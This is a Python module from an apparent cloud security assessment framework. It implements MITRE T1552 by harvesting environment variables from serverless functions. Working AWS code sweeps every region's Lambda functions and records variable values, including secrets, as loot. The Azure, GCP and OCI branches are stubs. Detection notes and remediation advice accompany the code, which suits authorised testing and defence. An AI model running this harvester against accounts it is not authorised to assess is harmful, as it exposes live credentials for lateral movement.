# ================================================================
# TECHNIQUE: credential_access/serverless_env_harvest
# ----------------------------------------------------------------
# TACTIC:    Credential Access (TA0006)
# TECHNIQUE: T1552 — Unsecured Credentials
#
# PURPOSE:
#   Attempt to harvest plaintext credentials, connection strings, API keys,
#   and  sensitive variables hardcoded directly into the environment
#   variables of  serverless functions (e.g., Lambda, Azure Functions).
#   Attackers routinely map these configurations natively to pivot via
#   collateral identities embedded in  poorly secured function execution
#   scopes.
#
# PROVIDERS: aws, azure, gcp, oci
#
#
# HOW IT WORKS (AWS):
#   Requires lambda:ListFunctions or lambda:GetFunctionConfiguration.
#   Iterates  across all AWS regions invoking lambda.list_functions()
#   and extracting the  Environment.Variables dictionary attached to
#   each function configuration block.
#
# DETECTION (AWS):
#   CloudTrail: ListFunctions / GetFunctionConfiguration. Alert on volume
#   reads of function configurations by a user or role that typically does
#   not interact with serverless compute infrastructure.
#
# HOW IT WORKS (AZURE):
#   Requires Microsoft.Web/sites/config/Read. Executes
#   WebSiteManagementClient.web_apps.list()  for functions, then pulls
#   list_application_settings() to grab defined env configs.
#
# DETECTION (AZURE):
#   Azure Monitor: Microsoft.Web/sites/config/list/action. Config reads
#   implicitly require Web App Configurator / Contributor rights. Alert on
#   reads from non-admin IPs.
#
# HOW IT WORKS (GCP):
#   Requires cloudfunctions.functions.list / get. Scrapes
#   projects().locations().functions().list() specifically pulling the
#   build/environmentVariables dictionary blocks for keys.
#
# DETECTION (GCP):
#   Cloud Audit Logs: cloudfunctions.functions.list.
#
# HOW IT WORKS (OCI):
#   Requires FUNCTIONS_FUNCTION_READ. Extracts the configuration block
#   mapped  to FunctionsManagementClient.list_functions() payloads.
#
# DETECTION (OCI):
#   OCI Audit: ListFunctions pulling detailed config metrics.
# REFERENCES:
#   - https://attack.mitre.org/techniques/T1552/
#   - https://hackingthe.cloud/aws/exploitation/lambda_env_vars/
#
# SAFE:      Yes
# ================================================================


from __future__ import annotations

from typing import Any

from quantum_mechanic.core.context import ExecutionContext
from quantum_mechanic.core.technique import technique

# ----------------------------------------------------------------
# Loot schema — CloudFox-style output (loot.csv / table.txt)
# ----------------------------------------------------------------
LOOT_ITEMS_KEY = 'functions'
LOOT_SCHEMA = [
    ('function_name', 'name'),
    ('var_name', 'var_name'),
    ('var_value', 'var_value'),
    ('sensitivity', 'sensitivity'),
    ('notes', None),
]


@technique(
    technique_id='credential_access/serverless_env_harvest',
    tactic='credential_access',
    mitre_id='T1552',
    providers=['aws'],
    severity='high',
    safe=True,
    description='Harvest plaintext API keys and connection strings from serverless environments.',
)
def execute(ctx: ExecutionContext) -> dict[str, Any]:
    """
    Harvest plaintext API keys and connection strings from serverless environments.

    Generated from: serverless_env_harvest.yaml
    See: docs/architecture/attack_maps/ for full attack chain.
    """
    if ctx.provider_name == 'aws':
        return _aws(ctx)
    if ctx.provider_name == 'azure':
        return _azure(ctx)
    if ctx.provider_name == 'gcp':
        return _gcp(ctx)
    if ctx.provider_name == 'oci':
        return _oci(ctx)

    return {}


# ---------------------------------------------------------------------------
# Per-provider implementations
# ---------------------------------------------------------------------------
def _aws(ctx: ExecutionContext) -> dict[str, Any]:
    """
    Requires lambda:ListFunctions or lambda:GetFunctionConfiguration.
    Iterates  across all AWS regions invoking lambda.list_functions()
    and extracting the  Environment.Variables dictionary attached to
    each function configuration block.

    DETECTION:
    CloudTrail: ListFunctions / GetFunctionConfiguration. Alert on
    volume reads of function configurations by a user or role that
    typically does not interact with serverless compute infrastructure.

    TESTING INFRASTRUCTURE:
    Deploy an AWS Lambda function with a mocked Environment Variable
    mapped to a  dummy API key secret. Grant the investigating user
    lambda:ListFunctions.
    """
    # -----------------------------------------------------------------
    # Implementation steps (from attack map):
    # -----------------------------------------------------------------
    # Requires lambda:ListFunctions or lambda:GetFunctionConfiguration. Iterates  across all AWS regions invoking lambda.list_functions() and extracting the  Environment.Variables dictionary attached to each function configuration block.
    try:
        from botocore.exceptions import BotoCoreError, ClientError
        ec2 = ctx.session.client("ec2")

        try:
            regions_resp = ec2.describe_regions()
            regions = [r["RegionName"] for r in regions_resp.get("Regions", [])]
        except (BotoCoreError, ClientError):
            regions = ["us-east-1"]

        vulnerable_functions = []
        for region in regions:
            try:
                l_client = ctx.session.client("lambda", region_name=region)
                paginator = l_client.get_paginator("list_functions")
                for page in paginator.paginate():
                    for f in page.get("Functions", []):
                        fn_name = f.get("FunctionName")
                        env_vars = f.get("Environment", {}).get("Variables", {})

                        if env_vars:
                            vulnerable_functions.append({
                                "name": fn_name,
                                "env": env_vars,
                                "region": region,
                            })

                            ctx.finding(
                                title=f"Exposed Lambda Environment Variables: {fn_name} (AWS)",
                                severity='high',
                                evidence={
                                    "function": fn_name,
                                    "region": region,
                                    "env_vars": env_vars
                                },
                                recommendation="Move hardcoded secrets to AWS Secrets Manager.",
                                mitre_id='T1552',
                                detection_log="CloudTrail: ListFunctions / GetFunctionConfiguration",
                            )
            except ClientError:
                pass

        return {
            "provider": "aws",
            "vulnerable_functions": vulnerable_functions,
            "total": len(vulnerable_functions)
        }
    except Exception as e:
        return {"provider": "aws", "error": str(e)}
def _azure(ctx: ExecutionContext) -> dict[str, Any]:
    """
    Requires Microsoft.Web/sites/config/Read. Executes
    WebSiteManagementClient.web_apps.list()  for functions, then pulls
    list_application_settings() to grab defined env configs.

    DETECTION:
    Azure Monitor: Microsoft.Web/sites/config/list/action. Config reads
    implicitly require Web App Configurator / Contributor rights. Alert
    on reads from non-admin IPs.

    TESTING INFRASTRUCTURE:
    Create an Azure FunctionApp with custom Configuration App Settings
    containing dummy secrets. Grant attacker principal Web Plan
    Contributor rights.
    """
    # -----------------------------------------------------------------
    # Implementation steps (from attack map):
    # -----------------------------------------------------------------
    # Requires Microsoft.Web/sites/config/Read. Executes WebSiteManagementClient.web_apps.list()  for functions, then pulls list_application_settings() to grab defined env configs.
    # -----------------------------------------------------------------
    return {
        "provider": "azure",
        "status": "not_implemented",
        "note": "Azure implementation pending.",
    }
def _gcp(ctx: ExecutionContext) -> dict[str, Any]:
    """
    Requires cloudfunctions.functions.list / get. Scrapes
    projects().locations().functions().list() specifically pulling the
    build/environmentVariables dictionary blocks for keys.

    DETECTION:
    Cloud Audit Logs: cloudfunctions.functions.list.

    TESTING INFRASTRUCTURE:
    Deploy a Gen2 Cloud Function mapped with dummy string environment
    variables. Grant the attacker service account
    roles/cloudfunctions.viewer.
    """
    # -----------------------------------------------------------------
    # Implementation steps (from attack map):
    # -----------------------------------------------------------------
    # Requires cloudfunctions.functions.list / get. Scrapes projects().locations().functions().list() specifically pulling the build/environmentVariables dictionary blocks for keys.
    # -----------------------------------------------------------------
    return {
        "provider": "gcp",
        "status": "not_implemented",
        "note": "GCP implementation pending.",
    }
def _oci(ctx: ExecutionContext) -> dict[str, Any]:
    """
    Requires FUNCTIONS_FUNCTION_READ. Extracts the configuration block
    mapped  to FunctionsManagementClient.list_functions() payloads.

    DETECTION:
    OCI Audit: ListFunctions pulling detailed config metrics.

    TESTING INFRASTRUCTURE:
    Create an OCI Function with configuration parameters set to dummy
    passwords. Grant attacker group inspect functions.
    """
    # -----------------------------------------------------------------
    # Implementation steps (from attack map):
    # -----------------------------------------------------------------
    # Requires FUNCTIONS_FUNCTION_READ. Extracts the configuration block mapped  to FunctionsManagementClient.list_functions() payloads.
    # -----------------------------------------------------------------
    return {
        "provider": "oci",
        "status": "not_implemented",
        "note": "OCI implementation pending.",
    }
